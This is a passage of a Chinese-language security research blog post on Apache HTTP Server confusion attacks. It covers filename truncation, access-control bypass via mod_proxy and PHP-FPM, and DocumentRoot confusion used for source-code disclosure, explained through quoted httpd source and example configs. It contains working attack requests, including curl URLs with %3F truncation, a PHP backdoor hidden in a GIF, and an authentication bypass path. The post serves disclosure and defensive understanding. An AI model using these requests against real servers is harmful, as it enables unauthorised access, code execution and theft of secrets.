<p>由於這是一個針對 Httpd 架構以及其內部機制所帶來的新攻擊面，<del>理所當然第一個參與的人可以找到最多漏洞，因此我也是目前擁有最多 Apache HTTP Server CVE 的人 😉</del>，導致很多更新修復由於其歷史架構無法向下兼容。 所以對於很多運行許久的正式伺服器來說修復並不是一件容易的事，若網站管理員不經思考就直接更新反而會打破許多舊有的設定造成服務中斷。 😨</p>

<p>接下來就開始介紹這次發展出來的攻擊們吧！</p>

<p><br /></p>

<h3 id="-1-filename-confusion">🔥 1. Filename Confusion</h3>

<p>首先，第一個是基於 Filename 欄位上的 Confusion，從字面上來看 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 應該是一個檔案系統路徑，然而在 Httpd 中，有些模組會把它當成網址來處理。 如果在 HTTP 請求的上下文中，有些模組把 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 當成檔案路徑，而其他模組將它當成網址，這其中的不一致就會造成安全上的問題！</p>

<p><br /></p>

<h4 id="️-primitive-1-1-truncation">⚔️ Primitive 1-1. Truncation</h4>

<p>所以哪些模組會把 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 當成網址呢？ 首先是 <code class="language-plaintext highlighter-rouge">mod_rewrite</code> 允許網站管理員透過 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 語法輕鬆的將路徑透過指定的規則改寫：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span> Pattern Substitution [flags]
</code></pre></div></div>

<p>其中目標可以是一個檔案系統路徑或是一個網址，我想這應該是一個為了使用者體驗所做出的方便，但同時這個「方便」也帶出了一些風險，例如<strong>在改寫路徑時，<code class="language-plaintext highlighter-rouge">mod_rewrite</code> 會強制把結果視為網址處理 (<code class="language-plaintext highlighter-rouge">splitout_queryargs()</code>)</strong>，這導致了在 HTTP 請求中可以透過一個問號 <code class="language-plaintext highlighter-rouge">%3F</code> 去截斷 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 後面的路徑或網址，並引出以下兩種攻擊手法。</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141">modules/mappers/mod_rewrite.c#L4141</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Apply a single RewriteRule
 */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">apply_rewrite_rule</span><span class="p">(</span><span class="n">rewriterule_entry</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">rewrite_ctx</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ap_regmatch_t</span> <span class="n">regmatch</span><span class="p">[</span><span class="n">AP_MAX_REG_MATCH</span><span class="p">];</span>
    <span class="n">apr_array_header_t</span> <span class="o">*</span><span class="n">rewriteconds</span><span class="p">;</span>
    <span class="n">rewritecond_entry</span> <span class="o">*</span><span class="n">conds</span><span class="p">;</span>
    
    <span class="c1">// [...]</span>
    
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">rewriteconds</span><span class="o">-&gt;</span><span class="n">nelts</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">rewritecond_entry</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">conds</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">rc</span> <span class="o">=</span> <span class="n">apply_rewrite_cond</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">ctx</span><span class="p">);</span>
        
        <span class="c1">// [...] do the remaining stuff</span>
        
    <span class="p">}</span>
    
    <span class="cm">/* Now adjust API's knowledge about r-&gt;filename and r-&gt;args */</span>
    <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="n">newuri</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">perdir</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">RULEFLAG_DISCARDPATHINFO</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">path_info</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">splitout_queryargs</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">);</span>         <span class="c1">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span>
    
    <span class="c1">// [...]</span>
<span class="p">}</span>
</code></pre></div></div>

<h5 id="️-1-1-1-path-truncation">✔️ 1-1-1. Path Truncation</h5>

<p>首先，第一個攻擊手法是檔案系統路徑上的截斷，想像下面這個 <code class="language-plaintext highlighter-rouge">RewriteRule</code>：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteEngine</span> <span class="ss">On</span>
<span class="nc">RewriteRule</span> "^/user/(.+)$" "/var/user/$1/profile.yml"
</code></pre></div></div>

<p>伺服器會根據網址路徑 <code class="language-plaintext highlighter-rouge">/user/</code> 後的使用者名稱開啟相對應的個人設定檔案，例如：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/user/orange
 <span class="c"># the output of file `/var/user/orange/profile.yml`</span>
</code></pre></div></div>

<p>由於 <code class="language-plaintext highlighter-rouge">mod_rewrite</code> 會強制將重寫後的結果當成一個網址處理，因此雖然目標是一個檔案系統路徑，但卻可以透過一個問號去截斷後方的 <code class="language-plaintext highlighter-rouge">/profile.yml</code> 例如：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/user/orange%2Fsecret.yml%3F
 <span class="c"># the output of file `/var/user/orange/secret.yml`</span>
</code></pre></div></div>

<p>這是我們的第一個攻擊手法 —— 路徑截斷。 對於這個攻擊手法的探索先稍稍停留在這邊，雖然目前看起來還只是一個小瑕疵，但請先記好它，因為這會在之後的攻擊中一再的出現，慢慢把這個看似無用的小破口撕裂開來！ 😜</p>

<h5 id="️-1-1-2-mislead-rewriteflag-assignment">✔️ 1-1-2. Mislead RewriteFlag Assignment</h5>

<p>截斷手法的第二個利用是誤導 <code class="language-plaintext highlighter-rouge">RewriteFlag</code> 的設置，想像網站管理員透過下列的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 去管理網站中路徑以及相對應模組：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteEngine</span> <span class="ss">On</span>
<span class="nc">RewriteRule</span>  ^(.+\.php)$  $1  [H=application/x-httpd-php]
</code></pre></div></div>

<p>如果請求附檔名是 <code class="language-plaintext highlighter-rouge">.php</code> 結尾則加上 <code class="language-plaintext highlighter-rouge">mod_php</code> 相對應的處理器 (此外也可以是環境變數或是 <code class="language-plaintext highlighter-rouge">Content-Type</code>，關於標誌的詳細設定可參考官方的手冊 <a href="https://httpd.apache.org/docs/2.4/rewrite/flags.html">RewriteRule Flags</a>)。</p>

<p>由於 <code class="language-plaintext highlighter-rouge">mod_rewrite</code> 的截斷行為發生在正規表達式匹配後，因此惡意的攻擊者可以利用原本的規則，透過 <code class="language-plaintext highlighter-rouge">?</code> 將 <code class="language-plaintext highlighter-rouge">RewriteFlag</code> 設定到不屬於它們的請求上。 例如上傳一個夾帶惡意 PHP 程式碼的 GIF 圖片並透過惡意請求將圖片當成後門執行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/upload/1.gif
 <span class="c"># GIF89a &lt;?=`id`;&gt;</span>

<span class="nv">$ </span>curl http://server/upload/1.gif%3fooo.php
 <span class="c"># GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
</code></pre></div></div>

<p><br /></p>

<h4 id="️-primitive-1-2-acl-bypass">⚔️ Primitive 1-2. ACL Bypass</h4>

<p>Filename Confusion 的第二個攻擊手法發生在 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 身上，相較前一個攻擊是無條件將目標當成網址處理，這次則是<strong>因為模組間對 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 的理解不一致所導致的認證及存取控制繞過</strong>！</p>

<p><code class="language-plaintext highlighter-rouge">mod_proxy</code> 會將 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 當成網址這件事情其實很合理，因為原本 Proxy 的目的就是將請求「導向」到其它網址上，但安全往往就是單獨拿出來看沒問題，搭配在一起就出問題了！ 特別是當大多數模組預設將 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 視為檔案系統路徑時，試想一下假設今天你使用基於檔案系統的存取控制模組，而現在 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 又會把 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 當成網址，這其中的不一致就可以導致存取控制或是認證被繞過！</p>

<p>一個經典的例子是，網站管理員透過 <code class="language-plaintext highlighter-rouge">Files</code> 語法去對單一檔案加上限制，例如 <code class="language-plaintext highlighter-rouge">admin.php</code>：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> "admin.php"</span><span class="p">&gt;
</span>    <span class="nc">AuthType</span> <span class="ss">Basic</span> 
    <span class="ss">AuthName</span> "Admin Panel"
    <span class="nc">AuthUserFile</span> "/etc/apache2/.htpasswd"
    <span class="nc">Require</span> valid-user
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>在預設安裝的 PHP-FPM 環境中，這種設定可以被直接繞過！ 順道一提這也是 Apache HTTP Server 中最常見到的認證方式！ 假設今天你瀏覽了這樣的網址：</p>

<blockquote>
  <p>http://server/admin.php%3Fooo.php</p>
</blockquote>

<p>首先在這個網址的 HTTP 生命週期中，認證模組會將請求的檔案名稱與被保護的檔案進行比對，此時 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 欄位是 <code class="language-plaintext highlighter-rouge">admin.php?ooo.php</code> 理所當然與 <code class="language-plaintext highlighter-rouge">admin.php</code> 不符合，於是模組會認為當前請求不需要認證。 然而 PHP-FPM 的設定檔案又設定當收到結尾為 <code class="language-plaintext highlighter-rouge">.php</code> 的請求時透過 <code class="language-plaintext highlighter-rouge">SetHandler</code> 語法將請求轉交給 <code class="language-plaintext highlighter-rouge">mod_proxy</code>：</p>

<p><strong><em>Path: /etc/apache2/mods-enabled/php8.2-fpm.conf</em></strong></p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using (?:pattern) instead of (pattern) is a small optimization that</span>
<span class="c"># avoid capturing the matching pattern (as $1) which isn't used here</span>
<span class="p">&lt;</span><span class="nl">FilesMatch</span><span class="sr"> ".+\.ph(?:ar|p|tml)$"</span><span class="p">&gt;
</span>    <span class="nc">SetHandler</span> "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"
<span class="p">&lt;/</span><span class="nl">FilesMatch</span><span class="p">&gt;
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">mod_proxy</code> 會將 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 重寫成以下網址並根據其中的協議呼叫子模組 <code class="language-plaintext highlighter-rouge">mod_proxy_fcgi</code> 處理後續 FastCGI 協議的邏輯：</p>

<blockquote>
  <p>proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php</p>
</blockquote>

<p>由於這時後端在收到檔案名稱時已經是一個奇怪的格式了，PHP-FPM 只好對這個行為做特別處理，其中處理的邏輯如下：</p>

<p><strong><em>Path: <a href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044">sapi/fpm/fpm/fpm_main.c#L1044</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define APACHE_PROXY_FCGI_PREFIX "proxy:fcgi://"
#define APACHE_PROXY_BALANCER_PREFIX "proxy:balancer://"
</span>
<span class="k">if</span> <span class="p">(</span><span class="n">env_script_filename</span> <span class="o">&amp;&amp;</span>
    <span class="n">strncasecmp</span><span class="p">(</span><span class="n">env_script_filename</span><span class="p">,</span> <span class="n">APACHE_PROXY_FCGI_PREFIX</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">APACHE_PROXY_FCGI_PREFIX</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* advance to first character of hostname */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">env_script_filename</span> <span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">APACHE_PROXY_FCGI_PREFIX</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">'\0'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">'/'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">p</span><span class="o">++</span><span class="p">;</span>    <span class="cm">/* move past hostname and port */</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */</span>
        <span class="n">memmove</span><span class="p">(</span><span class="n">env_script_filename</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">apache_was_here</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* ignore query string if sent by Apache (RewriteRule) */</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">env_script_filename</span><span class="p">,</span> <span class="sc">'?'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">p</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>可以看到 PHP-FPM 先對檔案名稱正規化並對其中的問號 <code class="language-plaintext highlighter-rouge">?</code> 進行分隔取出其中實際的檔案路徑並執行 (也就是 <code class="language-plaintext highlighter-rouge">/var/www/html/admin.php</code>)。 所以基本上<strong>所有使用 <code class="language-plaintext highlighter-rouge">Files</code> 語法針對單一 PHP 檔案的認證或是存取控制設定在運行 PHP-FPM 的情境下都存在風險！</strong> 😮</p>

<p>從 GitHub 上可以找到非常多潛在有風險的設定，例如被限制在只有內網才能存取的 <code class="language-plaintext highlighter-rouge">phpinfo()</code>：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># protect phpinfo, only allow localhost and local network access</span>
<span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> php-info.php</span><span class="p">&gt;
</span>    <span class="c"># LOCAL ACCESS ONLY</span>
    <span class="c"># Require local </span>

    <span class="c"># LOCAL AND LAN ACCESS</span>
    <span class="nc">Require</span> ip 10 172 192.168
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>使用 <code class="language-plaintext highlighter-rouge">.htaccess</code> 阻擋起來的 Adminer：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> adminer.php</span><span class="p">&gt;
</span>    <span class="nc">Order</span> Allow,Deny
    <span class="nc">Deny</span> <span class="ss">from</span> <span class="ss">all</span>
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>被保護起來的 <code class="language-plaintext highlighter-rouge">xmlrpc.php</code>：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> xmlrpc.php</span><span class="p">&gt;
</span>    <span class="nc">Order</span> Allow,Deny
    <span class="nc">Deny</span> <span class="ss">from</span> <span class="ss">all</span>
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>防止直接存取的命令行工具：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> "cron.php"</span><span class="p">&gt;
</span>    <span class="nc">Deny</span> <span class="ss">from</span> <span class="ss">all</span>
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>透過認證模組以及 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 間對 <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> 欄位理解的不一致，上面所有的例子都可以透過一個 <code class="language-plaintext highlighter-rouge">?</code> 成功繞過！</p>

<p><br /></p>

<h3 id="-2-documentroot-confusion">🔥 2. DocumentRoot Confusion</h3>

<p>接下來要介紹的攻擊是基於 DocumentRoot 上的 Confusion Attack！ 首先你可以思考一下，對於下面這樣子的 Httpd 設定：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">DocumentRoot</span> /var/www/html
<span class="nc">RewriteRule</span>  ^/html/(.*)$   /$1.html
</code></pre></div></div>

<p>當瀏覽 <code class="language-plaintext highlighter-rouge">http://server/html/about</code> 時，到底實際 Httpd 會開啟哪個檔案？ 是根目錄下的 <code class="language-plaintext highlighter-rouge">/about.html</code> 還是 DocumentRoot 下的 <code class="language-plaintext highlighter-rouge">/var/www/html/about.html</code> 呢？</p>

<p><img src="/assets/img/blog/20240809/2.png" alt="" /></p>

<p>答案是 —— <strong>兩個路徑都會存取</strong>。 這也是我們的第二個 Confusion Attack，<strong>對於任意<sup>[1]</sup>的 <code class="language-plaintext highlighter-rouge">RewriteRule</code>，Httpd 總是會嘗試開啟帶有 DocumentRoot 的路徑以及沒有的路徑！</strong> 有趣吧 😉</p>

<p><em>[1] 位於 <code class="language-plaintext highlighter-rouge">Server Config</code> 或 <code class="language-plaintext highlighter-rouge">VirtualHost Block</code> 內</em></p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939">modules/mappers/mod_rewrite.c#L4939</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">conf</span><span class="o">-&gt;</span><span class="n">options</span> <span class="o">&amp;</span> <span class="n">OPTION_LEGACY_PREFIX_DOCROOT</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">uri_reduced</span> <span class="o">=</span> <span class="n">apr_table_get</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">notes</span><span class="p">,</span> <span class="s">"mod_rewrite_uri_reduced"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prefix_stat</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">pool</span><span class="p">)</span> <span class="o">||</span> <span class="n">uri_reduced</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>     <span class="c1">// &lt;------ [1] access without root</span>
        <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">uri</span><span class="p">;</span>

        <span class="n">r</span><span class="o">-&gt;</span><span class="n">uri</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">;</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">ap_core_translate</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>             <span class="c1">// &lt;------ [2] access with root</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">uri</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="n">OK</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">rewritelog</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"prefixing with document_root of %s"</span>
                        <span class="s">" FAILED"</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>

            <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">rewritelog</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"prefixed with document_root to %s"</span><span class="p">,</span>
                    <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="n">rewritelog</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"go-ahead with %s [OK]"</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">OK</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div></div>

<p>當然絕大部分的情況是目標檔案不存在，於是 Httpd 會存取帶有 DocumentRoot 的版本，但這個行為已經讓我們能夠「故意的」去存取 Web Root 以外的路徑，<strong>如果今天可以控制 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 的目標前綴那我們是不是就能瀏覽作業系統上的任意檔案了？</strong> 這也是我們第二個 Confusion Attack 的精神！ 從 GitHub 中可以找到千千萬萬個有問題的寫法，有趣的是甚至連<a href="https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query">官方的範例文件</a>都是易遭受攻擊的：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remove mykey=???</span>
<span class="nc">RewriteCond</span> "%{QUERY_STRING}" "(.*(?:^|&amp;))mykey=([^&amp;]*)&amp;?(.*)&amp;?$"
<span class="nc">RewriteRule</span> "(.*)" "$1?%1%3"
</code></pre></div></div>

<p>除此之外還有其它亦受影響的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 例如基於快取需求或是將想副檔名隱藏起來的 URL Masking 規則：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span>  "^/html/(.*)$"  "/$1.html"
</code></pre></div></div>

<p>或是想節省流量，嘗試使用壓縮版本的靜態檔案規則：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span>  "^(.*)\.(css|js|ico|svg)" "$1\.$2.gz"
</code></pre></div></div>

<p>將老舊的網站轉址到根目錄的規則：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span>  "^/oldwebsite/(.*)$"  "/$1"
</code></pre></div></div>

<p>對所有 CORS 的預檢請求都回傳 200 OK 的規則：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteCond</span> %{REQUEST_METHOD} <span class="ss">OPTIONS</span>
<span class="nc">RewriteRule</span> ^(.*)$ $1 [R=200,L]
</code></pre></div></div>

<p>理論上只要 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 的目標前綴可控，我們可以瀏覽幾乎整個檔案系統，但從前面的規則中發現還有一個限制我們必須跨過的，前面例子中所出現的副檔名如 <code class="language-plaintext highlighter-rouge">.html</code> 以及 <code class="language-plaintext highlighter-rouge">.gz</code> 的後綴都是讓我們沒那麼地自由的一個限制 —— 所以可以繞過這個限制嗎？ 不知道有沒有人想起前面在 Filename Confusion 章節所介紹的路徑截斷，透過這兩個攻擊的結合，我們可以自由的瀏覽作業系統上的任意檔案！</p>

<p>接下來的範例都基於這個不安全的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 來做示範：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteEngine</span> <span class="ss">On</span>
<span class="nc">RewriteRule</span>  "^/html/(.*)$"  "/$1.html"
</code></pre></div></div>

<p><br /></p>

<h4 id="️-primitive-2-1-server-side-source-code-disclosure">⚔️ Primitive 2-1. Server-Side Source Code Disclosure</h4>

<p>首先來介紹 DocumentRoot Confusion 的第一個攻擊手法 —— <strong>任意伺服器端程式碼洩漏</strong>！</p>

<p>由於 Httpd 會根據當前目錄或是當前虛擬主機設定決定是否當成 Server-Side Script 處理，因此透過絕對路徑去存取目標程式碼可以混淆 Httpd 的邏輯導致洩漏原本該被當成程式碼執行的檔案內容。</p>

<h5 id="️-2-1-1-disclose-cgi-source-code">✔️ 2-1-1. Disclose CGI Source Code</h5>

<p>首先是洩漏伺服器端的 CGI 程式碼，由於 <code class="language-plaintext highlighter-rouge">mod_cgi</code> 是透過 <code class="language-plaintext highlighter-rouge">ScriptAlias</code> 將 CGI 目錄與所指定的 URL 前綴綁定起來，當使用絕對路徑直接瀏覽 CGI 時由於 URL 前綴變了，因此可以直接洩漏出檔案原始碼。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/cgi-bin/download.cgi
 <span class="c"># the processed result from download.cgi</span>
<span class="nv">$ </span>curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 <span class="c"># #!/usr/bin/perl</span>
 <span class="c"># use CGI;</span>
 <span class="c"># ...</span>
 <span class="c"># # the source code of download.cgi</span>
</code></pre></div></div>

<h5 id="️-2-1-2-disclose-php-source-code">✔️ 2-1-2. Disclose PHP Source Code</h5>

<p>接著是洩漏伺服器端的 PHP 程式碼，由於 PHP 的使用場景眾多，若只針對特定目錄或是虛擬主機套用 PHP 環境的話 (常見於網站代管服務)，可以透過未啟用 PHP 的虛擬主機存取 PHP 檔案以洩漏原始碼！</p>

<p>例如 <code class="language-plaintext highlighter-rouge">www.local</code> 以及 <code class="language-plaintext highlighter-rouge">static.local</code> 兩個虛擬主機都託管在同一台伺服器上，<code class="language-plaintext highlighter-rouge">www.local</code> 允許運行 PHP 而 <code class="language-plaintext highlighter-rouge">static.local</code> 則純粹負責處理靜態檔案，因此可以透過下面的方式洩漏出 <code class="language-plaintext highlighter-rouge">config.php</code> 內的敏感資訊：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://www.local/config.php
 <span class="c"># the processed result (empty) from config.php</span>
<span class="nv">$ </span>curl http://www.local/var/www.local/config.php%3F <span class="nt">-H</span> <span class="s2">"Host: static.local"</span>
 <span class="c"># the source code of config.php</span>
</code></pre></div></div>

<p><br /></p>

<h4 id="️-primitive-2-2-local-gadgets-manipulation">⚔️ Primitive 2-2. Local Gadgets Manipulation!</h4>

<p>接下來是我們的第二個攻擊手法 —— <strong>Local Gadgets Manipulation</strong>。</p>

<p>首先，在前面介紹到「瀏覽作業系統上的任意檔案」時不知道你有沒有好奇： 「欸那是不是一個不安全的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 就可以存取到 <code class="language-plaintext highlighter-rouge">/etc/passwd</code>？」 對的 —— 但也不完全對。 蛤？</p>

<p>技術上來說確實伺服器會去檢查 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 是否存在，但 Apach HTTP Server 內建的存取控制阻擋了我們的存取，這裡是 Apache HTTP Server 的<a href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">設定檔模板內容</a>：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> /</span><span class="p">&gt;
</span>    <span class="nc">AllowOverride</span> <span class="ss">None</span>
    <span class="nc">Require</span> <span class="ss">all</span> denied
<span class="p">&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
</span></code></pre></div></div>

<p>會觀察到預設阻擋了根目錄 <code class="language-plaintext highlighter-rouge">/</code> 的瀏覽 (<code class="language-plaintext highlighter-rouge">Require all denied</code>)，然而實際上這就沒戲了嗎？ 實際上再詳細追查各個 Httpd 的發行版會發現 <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165">Debian/Ubuntu</a> 作業系統預設允許了 <code class="language-plaintext highlighter-rouge">/usr/share</code>：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> /usr/share</span><span class="p">&gt;
</span>    <span class="nc">AllowOverride</span> <span class="ss">None</span>
    <span class="nc">Require</span> <span class="ss">all</span> granted
<span class="p">&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
